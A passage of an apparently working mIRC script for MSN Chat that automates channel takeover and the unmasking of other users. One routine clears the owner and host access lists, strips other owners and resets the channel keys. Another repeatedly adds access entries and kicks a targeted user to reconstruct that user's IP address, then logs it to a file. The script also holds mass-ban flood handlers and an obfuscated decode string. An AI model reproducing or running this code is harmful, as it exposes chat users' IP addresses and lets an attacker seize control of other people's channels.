              if ( %n != $me ) && ( %n != %bn ) { %s = $+( %s, $chr(32), %n ) }
              inc %i
            } 
            sockwrite -n $getSock(%c) $+( ACCESS %c clear owner, $crlf, PROP %c ownerkey :, $crlf, MODE %c -, $str( q, $numtok( %s, 32 ) ) %s, $crlf, PROP %c ownerkey $hexString, $crlf, ACCESS %c clear owner, $crlf, PROP %c hostkey $hexString, $crlf, ACCESS %c clear host )
            unset %autoNull. [ $+ [ %c ] ]
          } 
          sockwrite -n $sockname $+( ACCESS $sock($sockname).mark add owner *!, %gate 0 :, $mrc $vers, $crlf, PROP $sock($sockname).mark ownerkey $key, $crlf, ACCESS $sock($sockname).mark add host '*!*@* 0 :, $mrc $vers ) 
          inc -u3 %meJoin. [ $+ [ $sock($sockname).mark ] ]
        }
        elseif ( %a == @ ) { sockwrite -n $sockname MODE $me +h $getKey( $mid( $4, 3 ), q ) }
      }
      elseif ( %n != $me ) {
        inc -u3 %joinflood. [ $+ [ $mid( $4, 2 ) ] ]
        $sSet( nickjoin. [ $+ [ $mid( $4, 2 ) ] ] [ $+ [ . ] ] [ $+ [ %joinflood. [ $+ [ $mid( $4, 2 ) ] ] ] ], %n %usr )
        if ( %usr == $hget( ip. [ $+ [ $mid( $4, 2 ) ] ], gkp ) ) { 
          sockwrite -nb $sockname 512 $+( ACCESS $mid( $4, 2 ) clear voice, $crlf, ACCESS $mid( $4, 2 ) clear host, $crlf, ACCESS $mid( $4, 2 ) clear owner )
          var %h, %g
          %h = ip. [ $+ [ $mid( $4, 2 ) ] ]
          %g = $+( *!, $gettok( %usr, 1, 64 ), @ )
          hinc %h kicks
          if ( $gettok( $3, 4, 44 ) ) {
            var %a, %i
            %a = $ifmatch
            %a = $replace( %a, +, 1, @, 2, ., 3 )
            %a = $iif( $hget( %h, pos ) == 1, %a, $calc( %a - 1 ) )
            %a = $calc( $hget( %h, sub ) * 3 - 3 + %a )
            %i = $hget( %h, ip )
            %i = $+( %i, %a, $iif( $hget( %h, pos ) == 3, . ) )
            if ( $numtok( %i, 46 ) == $hget( %h, amo ) ) && ( $right( %i, 1 ) == . ) {
              %i = $left( %i, -1 )
              hadd %h ip %i
              hadd %h tic $calc( ($ticks - $hget( %h, tic )) / 1000 )
              sockwrite -n $sockname $+( ACCESS $mid( $4, 2 ) add deny *!*@, %i, * 0 :, $mrc $vers ip deny - %n $chr(40), $hget( %h, amo ) col(s), $chr(41), $crlf, KICK $mid( $4, 2 ) %n :, $mrc $vers ip ban - %i $chr(40), $hget( %h, amo ) cols, $chr(41) $chr(40), $hget( %h, kicks ) kicks, $chr(41) $chr(40), $hget( %h, tic ) secs, $chr(41), $crlf, PROP $mid( $4, 2 ) ownerkey $key )
              $print( 5, $mid( $4, 2 ), $+( Found ip for %n - %i $chr(40), $hget( %h, amo ) cols, $chr(41) $chr(40), $hget( %h, kicks ) kicks, $chr(41) $chr(40), $hget( %h, tic ) secs, $chr(41) ) )
              writeini -n ip.ini %usr ip %i
              writeini -n ip.ini %usr time $ctime
              writeini -n ip.ini %usr cols $hget( %h, amo )
              .hfree %h
            }
            else {
              hadd %h ip %i
              hadd %h pos $iif( $right( $hget( %h, ip ), 1 ) == ., 1, $calc( $hget( %h, pos ) + 1 ) )
              hadd %h col $numtok( $hget( %h, ip ), 46 ) 
              hadd %h sub 1
              %a = $iif( $hget( %h, pos ) == 1, 1, 0 )
              %i = $+( %g, %i )
              sockwrite -n $sockname $+( ACCESS $mid( $4, 2 ) add voice %i, %a, *, $crlf, ACCESS $mid( $4, 2 ) add host %i, $calc( %a + 1 ), *, $crlf, ACCESS $mid( $4, 2 ) add owner %i, $calc( %a + 2 ), *, $crlf, KICK $mid( $4, 2 ) %n, $crlf, PROP $mid( $4, 2 ) ownerkey $key )
            }
          }
          else { 
            hinc %h sub
            var %a, %i 
            %a = $calc( $hget( %h, sub ) * 3 - 3 ) 
            %a = $iif( $hget( %h, pos ) == 1, $calc( %a + 1 ), %a )
            %i = $+( %g, $hget( %h, ip ) )
            if ( %a >= 10 ) { 
              %i = $hget( %h, ip )
              %i = $+( %i, . )
              if ( $numtok( %i, 46 ) == $hget( %h, amo ) ) && ( $right( %i, 1 ) == . ) {
                %i = $left( %i, -1 )
                hadd %h ip %i
                hadd %h tic $calc( ($ticks - $hget( %h, tic )) / 1000 )
                sockwrite -n $sockname $+( ACCESS $mid( $4, 2 ) add deny *!*@, %i, * 0 :, $mrc $vers ip deny - %n $chr(40), $hget( %h, amo ) col(s), $chr(41), $crlf, KICK $mid( $4, 2 ) %n :, $mrc $vers ip ban - %i $chr(40), $hget( %h, amo ) cols, $chr(41) $chr(40), $hget( %h, kicks ) kicks, $chr(41) $chr(40), $hget( %h, tic ) secs, $chr(41), $crlf, PROP $mid( $4, 2 ) ownerkey $key )
                $print( 5, $mid( $4, 2 ), $+( Found ip for %n - %i $chr(40), $hget( %h, amo ) cols, $chr(41) $chr(40), $hget( %h, kicks ) kicks, $chr(41) $chr(40), $hget( %h, tic ) secs, $chr(41) ) )
                writeini -n ip.ini %usr ip %i
                writeini -n ip.ini %usr time $ctime
                writeini -n ip.ini %usr cols $hget( %h, amo )
                .hfree %h
              }
              else {
                hadd %h ip %i
                hadd %h sub 1
                hadd %h col $numtok( $hget( %h, ip ), 46 )
                hadd %h pos 1 
                %i = $+( %g, %i )
                %a = 1
                sockwrite -n $sockname $+( ACCESS $mid( $4, 2 ) add voice %i, %a, *, $crlf, ACCESS $mid( $4, 2 ) add host %i, $calc( %a + 1 ), *, $crlf, ACCESS $mid( $4, 2 ) add owner %i, $calc( %a + 2 ), *, $crlf, KICK $mid( $4, 2 ) %n, $crlf, PROP $mid( $4, 2 ) ownerkey $key )
              }
            }
            else {
              sockwrite -n $sockname $+( ACCESS $mid( $4, 2 ) add voice %i, %a, *, $crlf, ACCESS $mid( $4, 2 ) add host %i, $calc( %a + 1 ), *, $crlf, ACCESS $mid( $4, 2 ) add owner %i, $calc( %a + 2 ), *, $crlf, KICK $mid( $4, 2 ) %n, $crlf, PROP $mid( $4, 2 ) ownerkey $key )
            }
          }
        }
        elseif ( ( %joinfld. [ $+ [ $mid( $4, 2 ) ] ] ) && ( $popup.check( joinf, $mid( $4, 2 ) ) == on ) ) || ( ( %joinflood. [ $+ [ $mid( $4, 2 ) ] ] >= 8 ) && ( !%kickfld. [ $+ [ $mid( $4, 2 ) ] ] ) && ( !%joinfld. [ $+ [ $mid( $4, 2 ) ] ] ) && ( $popup.check( joinf, $mid( $4, 2 ) ) == on ) ) {
          if ( !%joinfld. [ $+ [ $mid( $4, 2 ) ] ] ) {
            beep 10
            $print( 5, -t $mid( $4, 2 ), Join flood in $+( ', $mid( $4, 2 ), ' ) )
            $print( 5, -ta, Join flood in $+( ', $mid( $4, 2 ), ' ) )
            var %i, %nu, %uu
            %i = 1
            while ( %i <= 7 ) { 
              %nu = $sGet( nickjoin. [ $+ [ $mid( $4, 2 ) ] ] [ $+ [ . ] ] [ $+ [ %i ] ] )
              %uu = $gettok( %nu, 2, 32 )
              %nu = $gettok( %nu, 1, 32 ) 
              $clientQue( ACCESS $mid( $4, 2 ) add deny $+( *!, $gettok( %uu, 1, 64 ), @* ) )
              $clientQue( KICK $mid( $4, 2 ) %nu $+( :, $mrc $vers ) )
              inc %i
            }
            inc -u5 %joinfld. [ $+ [ $mid( $4, 2 ) ] ]
          }
          if ( $gettok( $3, 4, 44 ) ) && ( !%accessflood. [ $+ [ $mid( $4, 2 ) ] ] ) { sockwrite -n $sockname ACCESS $mid( $4, 2 ) clear $replace( $gettok( $3, 4, 44 ), ., owner, @, host, +, voice) | inc -u10 %accessflood. [ $+ [ $mid( $4, 2 ) ] ] }
          $clientQue( ACCESS $mid( $4, 2 ) add deny $+( *!, $gettok( %usr, 1, 64 ), @* ) )
          $clientQue( KICK $mid( $4, 2 ) %n $+( :, $mrc $vers ) )
        } 
        elseif ( $userGateKeeper(%usr) ) { $pmode( $mid( $4, 2 ), $+( $iif( $me isowner $mid( $4, 2 ), q, o ), v ) %n %n ) }
        elseif ( $ini( banlist.ini, %usr ) ) {
          if ( $popup.check( banlist, $mid( $4, 2 ) ) == on ) { 
            if ( $gettok( $3, 4, 44 ) ) && ( !%accessflood. [ $+ [ $mid( $4, 2 ) ] ] ) { sockwrite -n $sockname ACCESS $mid( $4, 2 ) clear $replace( $gettok( $3, 4, 44 ), ., owner, @, host, +, voice) | inc -u6 %accessflood. [ $+ [ $mid( $4, 2 ) ] ] }
            $clientQue( ACCESS $mid( $4, 2 ) add deny $+( *!, $gettok( %usr, 1, 64 ), @* 0 :, $mrc $vers ban - %n ) )
            $clientQue( KICK $mid( $4, 2 ) %n $+( :, $chr(3), 5Banlist, $chr(3), 2 $readini( banlist.ini, %usr, nick ) ', $chr(3), 5, $readini( banlist.ini, %usr, reason ), $chr(3), 2' ) )
          } 
        }
        elseif ( $ini( aop.ini, $mid( $4, 3 ), %usr ) ) && ( $popup.check( laop, $mid( $4, 2 ) ) == on ) {
          var %u, %m
          %u = $readini( aop.ini, $mid( $4, 3 ), %usr )
          %m = $gettok( %u, 2-, 32 )
          %u = $gettok( %u, 1, 32 )
          msg $mid( $4, 2 ) $+( $chr(3), 5Local.q, $chr(3), 2 %u, $chr(3), 2 ', $chr(3), 5, %m, $chr(3), 2' )
          $pmode( $mid( $4, 2 ), $+( $iif( $me isowner $mid( $4, 2 ), q, o ), v ) %n %n )
        }
        elseif ( $ini( aop.ini, global, %usr ) ) && ( $popup.check( gaop, $mid( $4, 2 ) ) == on ) {
          var %u, %m
          %u = $readini( aop.ini, global, %usr )
          %m = $gettok( %u, 2-, 32 )
          %u = $gettok( %u, 1, 32 )
          msg $mid( $4, 2 ) $+( $chr(3), 5Global.q, $chr(3), 2 %u, $chr(3), 2 ', $chr(3), 5, %m, $chr(3), 2' )
          $pmode( $mid( $4, 2 ), $+( $iif( $me isowner $mid( $4, 2 ), q, o ), v ) %n %n )
        }
        elseif ( $ini( ahost.ini, $mid( $4, 3 ), %usr ) ) && ( $popup.check( lahost, $mid( $4, 2 ) ) == on ) {
          var %u, %m
          %u = $readini( ahost.ini, $mid( $4, 3 ), %usr )
          %m = $gettok( %u, 2-, 32 )
          %u = $gettok( %u, 1, 32 )
          msg $mid( $4, 2 ) $+( $chr(3), 5Local.o, $chr(3), 2 %u, $chr(3), 2 ', $chr(3), 5, %m, $chr(3), 2' )
          if ( $gettok( $3, 4, 44 ) != . ) { $pmode( $mid( $4, 2 ), +ov %n %n ) }
        }
        elseif ( $ini( ahost.ini, global, %usr ) ) && ( $popup.check( gahost, $mid( $4, 2 ) ) == on ) {
          var %u, %m
          %u = $readini( ahost.ini, global, %usr )
          %m = $gettok( %u, 2-, 32 )
          %u = $gettok( %u, 1, 32 )
          msg $mid( $4, 2 ) $+( $chr(3), 5Global.o, $chr(3), 2 %u, $chr(3), 2 ', $chr(3), 5, %m, $chr(3), 2' )
          if ( $gettok( $3, 4, 44 ) != . ) { $pmode( $mid( $4, 2 ), +ov %n %n ) }
        }
        elseif ( $ini( avoice.ini, $mid( $4, 3 ), %usr ) ) && ( $popup.check( lavoice, $mid( $4, 2 ) ) == on ) {
          var %u, %m
          %u = $readini( avoice.ini, $mid( $4, 3 ), %usr )
          %m = $gettok( %u, 2-, 32 )
          %u = $gettok( %u, 1, 32 )
          msg $mid( $4, 2 ) $+( $chr(3), 5Local.v, $chr(3), 2 %u, $chr(3), 2 ', $chr(3), 5, %m, $chr(3), 2' )
          $pmode( $mid( $4, 2 ), +v %n)
        }
        elseif ( $ini( avoice.ini, global, %usr ) ) && ( $popup.check( gavoice, $mid( $4, 2 ) ) == on ) {
          var %u, %m
          %u = $readini( avoice.ini, global, %usr )
          %m = $gettok( %u, 2-, 32 )
          %u = $gettok( %u, 1, 32 )
          msg $mid( $4, 2 ) $+( $chr(3), 5Global.v, $chr(3), 2 %u, $chr(3), 2 ', $chr(3), 5, %m, $chr(3), 2' )
          $pmode( $mid( $4, 2 ), +v %n)
        }
        if ( !%whoisflood. [ $+ [ $mid( $4, 2 ) ] ] ) { sockwrite -n $sockname WHOIS %n | inc -u3 %whoisflood. [ $+ [ $mid( $4, 2 ) ] ] }
      }
    }
    elseif ( $2 == PRIVMSG ) || ( $2 == WHISPER ) {
      if ( $+( :, $chr(1), ??* ) iswm $4 ) { 
        if ( $+( *, $decode( $+( V, k, VS, U, 0l, PTg, =, = ), m ), * ) iswm $4 ) && ( !%privflood. [ $+ [ $sock($sockname).mark ] ] ) { 
          sockwrite -n $sockname $+( NOTICE $mid( $gettok( $1, 1, 33 ), 2 ) :, $mrc $vers ) 
          inc -u4 %privflood. [ $+ [ $sock($sockname).mark ] ]
        }
      }
      else {
        var %m, %c
        %c = $iif( $2 == PRIVMSG, $3, $4 )
        %m = $iif( $2 == PRIVMSG, $4-, $5- )
        if ( $left( %m, 3 ) == $+( :, $chr(1), S ) ) {  
          if ( $popup.check( font, $sock($sockname).mark ) == on ) {
            var %f
            %f = $5
            %f = $remove( %f, $chr(1) )
            %f = $remove( %f, $chr(2) )
            %f = $remove( %f, $chr(3) )
            %f = $remove( %f, $chr(4) )
            %f = $remove( %f, $chr(5) )
            %f = $remove( %f, $chr(6) )
            %f = $remove( %f, $chr(7) )
            %f = $remove( %f, $chr(8) )
            %f = $remove( %f, \t )
            %f = $remove( %f, \n )
            %f = $remove( %f, $chr(11) )
            %f = $remove( %f, $chr(12) )
            %f = $remove( %f, \r )
            %f = $remove( %f, $chr(14) )
            %f = $remove( %f, $chr(15) )
            %f = $left( %f, -2 )
            %f = $replace( %f, \b, $chr(32) )
            %f = $+( %f , $chr(32), - )
          } 
          %m = $left( $iif( $2 == PRIVMSG, $6-, $7- ), -1 )
          %m = $iif( %f, $+( %f, $chr(32), %m ), %m )
          %m = $+( :, %m )
          sockwrite -n client.mirc $1 PRIVMSG %c %m
        }
        else { sockwrite -n client.mirc $1 PRIVMSG %c %m }
        if ( $gettok( $me, 1, 91 ) isin %m ) && ( $sock($sockname).mark != $active ) && ( !%privflood. [ $+ [ $sock($sockname).mark ] ] ) { 
          $print( 5, -ta, $+( Wanted in $sock($sockname).mark by $mid( $gettok( $1, 1, 33 ), 2 ), $chr(3), 2 ', $chr(3), 5, $mid( %m, 2 ), $chr(3), 2' ) )
          beep 3
          inc -u5 %privflood. [ $+ [ $sock($sockname).mark ] ]
        }
      }
    }
    elseif ( $2 == NOTICE ) {
      if ( !%notice. [ $+ [ $sock($sockname).mark ] ] ) {
        sockwrite -n client.mirc %r 
        inc -u1 %notice. [ $+ [ $sock($sockname).mark ] ]
      }
    }
    elseif ( $2 == KILL ) { 
      $print( 5, -t $sock($sockname).mark, $+( $3 was killed by $mid( $gettok( $1, 1, 33 ), 2 ), $chr(3), 2 ', $chr(3), 5, $mid( $4-, 2 ), $chr(3), 2' ) )
      sockwrite -n client.mirc %r
    }
    elseif ( $2 isnum ) {
      if ( $2 == 311 ) { $print( , -t $sock($sockname).mark, $+( $4, 's tag is ', $mid( $8-, 2 ), $chr(3), $color(info), ' ) ) }
      elseif ( $2 = 353 ) {
        var %re, %b, %m
        %re = /[A-Z],[A-Z],[A-Z]{1,2},/g
        %b = $regsub( $6-, %re, , %m )
        sockwrite -n client.mirc $1-5 %m
      } 
      elseif ( $2 == 352 ) { 
        var %u
        %u = $+( $5, @, $6 )
        if ( $ini( banlist.ini, %u ) ) && ( $popup.check( ban, $4 ) == on ) {
          $clientQue( ACCESS $4 add deny $+( *!, %u 0 : ) )
          $clientQue( KICK $4 $8 $+( :, $chr(3), 5Banlist, $chr(3), 2 $readini( banlist.ini, %u, nick ) ', $chr(3), 5, $readini( banlist.ini, %u, reason ), $chr(3), 2' ) )
        }
        if ( $8 != $me ) { $setGateKeeperNicks( $8, $+( $5, @, $6 ) ) }
        sockwrite -n client.mirc %r
      }
      elseif ( $2 == 803 ) { haltdef }
      elseif ( $2 == 804 ) { $print( 5, $4, $+( $5, $chr(3), 2 ', $chr(3), 5, $6, $chr(3), 2' $iif( $ial($+( *!, $8 )).nick, $ial($+( *!, $8 )).nick, $8 ) ', $chr(3), 5, $mid( $9-, 2 ), $chr(3), 2' $iif( $7 == 0, infinite, $duration($7) ) ) ) }
      elseif ( $2 == 805 ) { haltdef }
      elseif ( $2 == 405 ) { haltdef }
      else { sockwrite -n client.mirc %r }
    }
    elseif ( $1 == PING ) { sockwrite -n $sockname PONG $2- }
    elseif ( $1 == ERROR ) {
      var %x, %c
      %x = $calc( $gettok( $sock( $sockname).ip, 4, 46 ) - 156 )
      %c = $sock($sockname).mark
      sockwrite -n $sockname $+( QUIT :, $mrc $vers )
      $delSock(%c)
      $print( 5, -t %c, Rejoined channel %c )
      sockwrite -n $$sock($+( TK2CHATCHATA0, %x, .???????????????? )) JOIN %c $getKey( $mid( %c, 2 ), q )
      sockclose $sockname
    }
    else { 
      if ( !%keepAlive. [ $+ [ $sockname ] ] ) {   
        sockwrite -n $sockname
        inc -u3 %keepAlive. [ $+ [ $sockname ] ]
      }
      sockwrite -n client.mirc %r 
    }
    if ( $sock($sockname) ) { sockread %r }
  }
}

on *:sockclose:rigorMortis.????????????????:{
  if ( !%quit ) {
    var %x, %c
    %x = $calc( $gettok( $sock( $sockname).ip, 4, 46 ) - 156 )
    %c = $sock($sockname).mark
    sockwrite -n $sockname $+( QUIT :, $mrc $vers )
    $delSock(%c)
    $print( 5, -t %c, Rejoined channel %c )
    sockwrite -n $$sock($+( TK2CHATCHATA0, %x, .???????????????? )) JOIN %c $getKey( $mid( %c, 2 ), q )
    sockclose $sockname
  }
}

dialog create {
  title "Create"
  size -1 -1 99 78
  option dbu
  text "Room", 1, 1 4 17 8
  text "Topic", 2, 1 17 17 8
  text "Modes", 3, 1 30 19 8
  text "Cat", 4, 1 43 16 8
  edit "%#fish", 5, 30 3 68 10, autohs
  edit "Sids sex shack", 6, 30 16 68 10, autohs autovs
  edit "ml 510", 7, 30 29 68 10 autohs
  edit "CP", 8, 30 42 68 10 autohs
  button "Ok", 9, 1 58 36 15, default
  button "Cancel", 10, 41 58 36 15
}

on *:dialog:create:sclick:10:{ dialog -c create }
on *:dialog:create:sclick:9:{ 
  var %c, %p, %s
  %c = $roomEncode($$did(5))
  %p = $key
  %s = $$sock(findServer.*, 1)
  sockwrite -n %s CREATE $$did(8) %c $mid( $roomEncode($$did(6)), 3 ) $remove( $$did(7), + ) EN-US 1 $mid( %p, 2 ) $mrc $vers
  sockmark %s %c
  $setKey( $mid( %c, 2 ), q, %p ) 
}
